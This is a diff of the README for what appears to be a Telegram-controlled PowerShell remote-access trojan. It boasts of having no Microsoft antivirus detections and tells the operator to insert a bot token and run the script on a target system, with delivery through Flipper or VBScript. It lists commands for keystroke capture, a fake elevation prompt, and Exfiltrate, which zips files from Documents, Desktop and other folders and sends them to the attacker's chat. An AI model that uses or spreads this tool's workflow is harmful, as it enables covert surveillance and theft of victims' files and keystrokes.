@@ -62,7 +62,7 @@ Confirmed working with no Microsoft AV detections, on a variety of Windows syste
  
  3. Click the provided link to open the chat E.G. "t.me/****bot" then type or click /start)
 
- 4. At the start off the the Script - Replace `$tg` with your Telegram Bot API Token
+ 4. At the start off the the Script - Replace `$tg` with your Telegram Bot API Token (only when running ps1 directly (not changed using Flipper, VBScript etc as it should be pre-defined there eg. `$tg = '****TOKEN****'`))
  
  5. Run the script on target system
  
@@ -80,7 +80,7 @@ Confirmed working with no Microsoft AV detections, on a variety of Windows syste
 
 Options           : Show a menu in chat listing all the below functions
 
-Kill              : Killswitch for 'KeyCapture' and 'Exfiltrate' commands (can take a few seconds to kill.)
+Kill              : Killswitch for `Key-Capture` and `Exfiltrate` commands (can take a few seconds to kill.)
 
 Extra-Info         : Extra command information and examples sent to the chat
 
@@ -112,7 +112,7 @@ Attempt-Elevate    : Send user a prompt to grant Administrator privilages in a n
 
 Exfiltrate        : Searches for, and sends, files to the chat as zip files split into 50mb each (Telegram max upload limit.)
 
- EXFILTRATION EXAMPLE COMMAND  =  Exfiltrate -path [FOLDERS] -filetype [FILETYPES]
+ EXFILTRATION EXAMPLE COMMAND  =  `Exfiltrate -path [FOLDERS] -filetype [FILETYPES]`
  
  FOLDERS = Documents, Desktop, Downloads, OneDrive, Pictures, Videos
  
